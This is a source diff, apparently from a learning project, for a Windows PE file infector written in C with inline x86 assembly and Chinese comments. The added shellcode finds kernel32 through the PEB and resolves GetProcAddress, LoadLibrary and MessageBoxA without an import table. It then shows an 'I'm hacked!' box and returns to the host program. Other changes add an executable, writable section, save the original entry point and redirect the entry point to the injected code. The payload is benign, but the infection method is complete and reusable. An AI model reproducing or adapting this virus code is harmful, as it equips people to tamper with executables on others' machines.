@@ -20,33 +20,247 @@ DWORD dwFileSize;
 DWORD dwSizeOfCode ;
 PBYTE pRemoteCode, pCode, pOrignCode;
 void code();
+void _addr_orign_aoep();
+void _addr_getprocAddress();
+void _addr_kernel32();
+void _addr_imagebase();
 void code_end();
+/*
+    0:先保存入口地址
+    1:先把入口地址指向病毒所在的段,在add section时做这个步骤
+    2:执行玩后跳到原本的入口地址
+*/
 __declspec(naked) void code()
 {
     __asm {
-        pushad                        //PUSHAD指令压入32位寄存器，其入栈顺序是:EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI 
+        pushad
         call    _delta
 _delta:
         pop     ebx                         // save registers context from stack
         sub     ebx, offset _delta
+/************************************************************/
+//要保持栈平衡
+        call offset _GetBaseKernel32
+        mov [ebx+_addr_kernel32],eax            //返回值eax中保存了kernel32的基地址
+        push eax
+        call offset _GetGetProcAddrBase
+        mov [ebx+_addr_getprocAddress],eax      //返回值eax中保存了getprocAddress的地址
+        pop ecx                                 //ecx中保存了kernel32的句柄
+        lea edx,[ebx + _str_getModuleHandleA]   //edx中保存了字符串的地址
+        push edx
+        push ecx
+        call eax  //调用getprocAddress
+        //返回值中包含了 getModuleHandleA的地址
+        push 0
+        call eax
+       //返回值中包含了pe文件基地址
+        mov [ebx + _addr_imagebase],eax//保存基地址,我们新建的这个段是不可写的
+       
+       
+        lea edx,[ebx +_str_LoadLibrary]
+        push edx
+        mov eax,[ebx+_addr_kernel32]
+        push eax
+        mov eax,[ebx+_addr_getprocAddress]
+        call eax
+        //返回值中包含了loadlibrary的地址
+        lea edx,[ebx+_str_user32]
+        push edx
+        call eax
+        //返回值中包含了user32.dll的基地址
+        lea edx,[ebx+_str_MessageBox]
+        push edx
+        push eax
+        mov eax,[ebx+_addr_getprocAddress]
+        call eax
+        //返回值中是，messagebox的地址
+        push 0
+        lea edx,[ebx+_str_hacked]
+        push edx
+        push edx
+        push 0
+        call eax
 
-        mov     eax, 0x00400000
-        add     eax,dword ptr [ebx + _addr_orign_aoep]
+
+
+/************************************************************/
+        mov     eax, dword ptr[ebx + _addr_imagebase] //定位基地址
+        add     eax,dword ptr [ebx + _addr_orign_aoep]//定位入口偏移
         mov     dword ptr [esp + 0x1C], eax     // save (dwBaseAddress + orign) to eax-location-of-context
         popad                                   // load registers context from stack
         push    eax
         xor     eax, eax
         retn                                    // >> jump to the Original AOEP
-_addr_orign_aoep:
-        _emit   0x4b
-        _emit   0x15
-        _emit   0x00
-        _emit   0x00
+/**************************返回原程序**********************************/
+_str_hacked:
+        _emit 'I'
+        _emit '\''
+        _emit 'm'
+        _emit ' '
+        _emit 'h'
+        _emit 'a'
+        _emit 'c'
+        _emit 'k'
+        _emit 'e'
+        _emit 'd'
+        _emit '!'
+        _emit 0x0
+_str_MessageBox:
+            _emit 'M'
+            _emit 'e'
+            _emit 's'
+            _emit 's'
+            _emit 'a'
+            _emit 'g'
+            _emit 'e'
+            _emit 'B'
+            _emit 'o'
+            _emit 'x'
+            _emit 'A'
+            _emit 0x0
+_str_user32:
+            _emit 'u'
+            _emit 's'
+            _emit 'e'
+            _emit 'r'
+            _emit '3'
+            _emit '2'
+            _emit '.'
+            _emit 'd'
+            _emit 'l'
+            _emit 'l'
+            _emit 0x0
+_str_LoadLibrary:
+            _emit 'L'
+            _emit 'o'
+            _emit 'a'
+            _emit 'd'
+            _emit 'L'
+            _emit 'i'
+            _emit 'b'
+            _emit 'r'
+            _emit 'a'
+            _emit 'r'
+            _emit 'y'
+            _emit 'A'
+            _emit 0x0
+_str_getModuleHandleA:
+            _emit 'G'
+            _emit 'e'
+            _emit 't'
+            _emit 'M'
+            _emit 'o'
+            _emit 'd'
+            _emit 'u'
+            _emit 'l'
+            _emit 'e'
+            _emit 'H'
+            _emit 'a'
+            _emit 'n'
+            _emit 'd'
+            _emit 'l'
+            _emit 'e'
+            _emit 'A'
+            _emit 0x0
+      // type : DWORD GetBaseKernel32()
+_GetBaseKernel32:
+        push    ebp
+        mov     ebp, esp
+        push    esi
+        push    edi
+        xor     ecx, ecx                    // ECX = 0
+        mov     esi, fs:[0x30]              // ESI = &(PEB) ([FS:0x30])
+        mov     esi, [esi + 0x0c]           // ESI = PEB->Ldr
+        mov     esi, [esi + 0x1c]           // ESI = PEB->Ldr.InInitOrder
+_next_module:
+        mov     eax, [esi + 0x08]           // EBP = InInitOrder[X].base_address
+        mov     edi, [esi + 0x20]           // EBP = InInitOrder[X].module_name (unicode)
+        mov     esi, [esi]                  // ESI = InInitOrder[X].flink (next module)
+        cmp     [edi + 12*2], cx            // modulename[12] == 0 ?
+        jne     _next_module                 // No: try next module.
+        pop     edi
+        pop     esi
+        mov     esp, ebp
+        pop     ebp
+        ret
+// ---------------------------------------------------------
+// type : DWORD GetGetProcAddrBase(DWORD base)
+_GetGetProcAddrBase:
+        push    ebp
+        mov     ebp, esp
+        push    edx
+        push    ebx
+        push    edi
+        push    esi
+
+        mov     ebx, [ebp+8]
+        mov     eax, [ebx + 0x3c] // edi = BaseAddr, eax = pNtHeader
+        mov     edx, [ebx + eax + 0x78]
+        add     edx, ebx          // edx = Export Table (RVA)
+        mov     ecx, [edx + 0x18] // ecx = NumberOfNames
+        mov     edi, [edx + 0x20] //
+        add     edi, ebx          // ebx = AddressOfNames
+
+_search:
+        dec     ecx
+        mov     esi, [edi + ecx*4]
+        add     esi, ebx
+        mov     eax, 0x50746547 // "PteG"
+        cmp     [esi], eax
+        jne     _search
+        mov     eax, 0x41636f72 //"Acor"
+        cmp     [esi+4], eax
+        jne     _search
+
+        mov     edi, [edx + 0x24] //
+        add     edi, ebx      // edi = AddressOfNameOrdinals
+        mov     cx, word ptr [edi + ecx*2]  // ecx = GetProcAddress-orinal
+        mov     edi, [edx + 0x1c] //
+        add     edi, ebx      // edi = AddressOfFunction
+        mov     eax, [edi + ecx*4]
+        add     eax, ebx      // eax = GetProcAddress
+        
+        pop     esi
+        pop     edi
+        pop     ebx
+        pop     edx
+        
+        mov     esp, ebp
+        pop     ebp
+        ret  
     }
+}
+__declspec(naked) void _addr_orign_aoep()
+{
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+}
+__declspec(naked) void _addr_getprocAddress()
+{
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+}
+__declspec(naked) void _addr_kernel32()
+{
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+}
+__declspec(naked) void _addr_imagebase()
+{
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+    __asm _emit 0xcc
+    __asm _emit 0xcc
 }
 __declspec(naked) void code_end()
 {
-    __asm _emit 0xBB
+    __asm _emit 0xcc
 }
 // make_code()函数是将开始标记code_start和结束标记code_end之间的所有二进制数据拷贝到一个缓冲区中
 DWORD make_code()
@@ -67,15 +281,16 @@ DWORD make_code()
     for (off = 0; off<dwSizeOfCode; off++) {
         *(pCode+off) = *(pOrignCode+off);
     }
-   // *(PDWORD)((PBYTE)_addr_orign_aoep-(DWORD)pOrignCode+(DWORD)pCode) = pOptHeader->AddressOfEntryPoint;
+    *(PDWORD)((PBYTE)_addr_orign_aoep-(DWORD)pOrignCode+(DWORD)pCode) = pOptHeader->AddressOfEntryPoint;
+    //把原来的入口地址保存在变量_addr_origna_aoep中
     return dwSizeOfCode;
 }
+/******************************************************************/
 static DWORD PEAlign(DWORD dwTarNum,DWORD dwAlignTo)
 {	
     //对齐处理
     return (((dwTarNum+dwAlignTo - 1) / dwAlignTo) * dwAlignTo);
 }
-/******************************************************************/
 WORD  wInjSecNo;
 BOOL AddNewSection()
 {
@@ -117,8 +332,8 @@ BOOL AddNewSection()
     pSecHeader[wInjSecNo]->VirtualAddress       = voffset;
     pSecHeader[wInjSecNo]->SizeOfRawData        = rsize;
     pSecHeader[wInjSecNo]->Misc.VirtualSize     = vsize;
-    pSecHeader[wInjSecNo]->Characteristics      = 0x60000020;
-    //设置新的section可执行,权限和.text一样
+    pSecHeader[wInjSecNo]->Characteristics      = 0xe0000020;
+    //设置新的section可执行,权限和.text一样,e表示可读可写可执行
     pSecHeader[wInjSecNo]->Name[0] = '.';
     pSecHeader[wInjSecNo]->Name[1] = 'm';
     pSecHeader[wInjSecNo]->Name[2] = 'y';
@@ -129,33 +344,12 @@ BOOL AddNewSection()
     pSecHeader[wInjSecNo]->Name[7] = '\0';
     
     pSecData[wInjSecNo] = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, rsize);
-    //分配的大小应该是对齐后的物理大小
     dwSecSize[wInjSecNo] = pSecHeader[wInjSecNo]->SizeOfRawData;
-    //这个值和rsize实际上时相等的
     CopyMemory(pSecData[wInjSecNo], pCode, dwSizeOfCode);
     wSecNum++;
     pFileHeader->NumberOfSections = wSecNum;
-    //section数++
-    /* 对所有的段做对齐处理
-    for(i = 0;i< wSecNum; i++) {
-        pSecHeader[i]->VirtualAddress =
-            PEAlign(pSecHeader[i]->VirtualAddress, pOptHeader->SectionAlignment);
-        pSecHeader[i]->Misc.VirtualSize =
-            PEAlign(pSecHeader[i]->Misc.VirtualSize, pOptHeader->SectionAlignment);
-        
-        pSecHeader[i]->PointerToRawData =
-            PEAlign(pSecHeader[i]->PointerToRawData, pOptHeader->FileAlignment);
-        
-        pSecHeader[i]->SizeOfRawData = 
-            PEAlign(pSecHeader[i]->SizeOfRawData, pOptHeader->FileAlignment);
-    }
-    */
-    //内存镜像大小，rva+内存对齐后的大小
-    //SizeOfImage这个值的大小，该值是所有节和头按照SectionAlignment 对齐后的大小
     pOptHeader->SizeOfImage = pSecHeader[wSecNum-1]->VirtualAddress + PEAlign(pSecHeader[wSecNum-1]->Misc.VirtualSize,pOptHeader->SectionAlignment);
-    //磁盘文件大小应该是最后一个字节即Num-1的偏移+磁盘对齐后的大小
     dwFileSize = pSecHeader[wSecNum-1]->PointerToRawData + pSecHeader[wSecNum - 1]->SizeOfRawData;
-    //边界清0是必须的
     pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
     pOptHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
     return TRUE;
@@ -163,64 +357,6 @@ BOOL AddNewSection()
     //不过有些PE文件，如关键的系统服务程序文件以及驱动程序文件则该值必须正确，否则系统加载器将拒绝加载
 }
 /******************************************************************/
-
-
-static DWORD RVA2Ptr(DWORD dwBaseAddress, DWORD dwRva)
-{
-    if ((dwBaseAddress != 0) && dwRva)
-        return (dwBaseAddress + dwRva);
-    else
-        return dwRva;
-}
-//----------------------------------------------------------------
-static PIMAGE_SECTION_HEADER RVA2Section(DWORD dwRVA)
-{
-    int i;
-    for(i = 0; i < wSecNum; i++) {
-        if ( (dwRVA >= pSecHeader[i]->VirtualAddress)
-            && (dwRVA <= (pSecHeader[i]->VirtualAddress 
-                + pSecHeader[i]->SizeOfRawData)) ) {
-            return ((PIMAGE_SECTION_HEADER)pSecHeader[i]);
-        }
-    }
-    return NULL;
-}
-
-//----------------------------------------------------------------
-static PIMAGE_SECTION_HEADER Offset2Section(DWORD dwOffset)
-{
-    int i;
-    for(i = 0; i < wSecNum; i++) {
-        if( (dwOffset>=pSecHeader[i]->PointerToRawData) 
-            && (dwOffset<(pSecHeader[i]->PointerToRawData + pSecHeader[i]->SizeOfRawData)))
-        {
-            return ((PIMAGE_SECTION_HEADER)pSecHeader[i]);
-        }
-    }
-    return NULL;
-}
-
-//================================================================
-static DWORD RVA2Offset(DWORD dwRVA)
-{
-    PIMAGE_SECTION_HEADER pSec;
-    pSec = RVA2Section(dwRVA);//ImageRvaToSection(pimage_nt_headers,Base,dwRVA);
-    if(pSec == NULL) {
-        return 0;
-    }
-    return (dwRVA + (pSec->PointerToRawData) - (pSec->VirtualAddress));
-}
-//----------------------------------------------------------------
-static DWORD Offset2RVA(DWORD dwOffset)
-{
-    PIMAGE_SECTION_HEADER pSec;
-    pSec = Offset2Section(dwOffset);
-    if(pSec == NULL) {
-        return (0);
-    }
-    return(dwOffset + (pSec->VirtualAddress) - (pSec->PointerToRawData));
-}
-
 BOOL CopyPEFileToMem(LPCSTR lpszFilename)
 {
     //先为整个文件分配堆空间，把pe拷贝进入，然后为每个模块分配空间，从pe空间拷贝过去，最后释放pe空间
@@ -362,7 +498,6 @@ BOOL CopyMen2File(LPCSTR pName)
    PIMAGE_NT_HEADERS       pMemNtHeaders;   
    PIMAGE_SECTION_HEADER   pMemSecHeaders;
    PIMAGE_SECTION_HEADER   pMenAddSec;
-
 /*********/
   pOptHeader->AddressOfEntryPoint=pSecHeader[wSecNum-1]->VirtualAddress;
   //修改入口地址为新添加的section的偏移
@@ -412,7 +547,7 @@ BOOL CopyMen2File(LPCSTR pName)
 int main()
 {
     LPCSTR lpszFileName = "hello.exe";
-    LPCSTR lpszInjFileName = "hello_inj.exe";
+    LPCSTR lpszInjFileName = "hello_inj4.exe";
     
     hHeap = GetProcessHeap();
     if (! CopyPEFileToMem(lpszFileName)) {
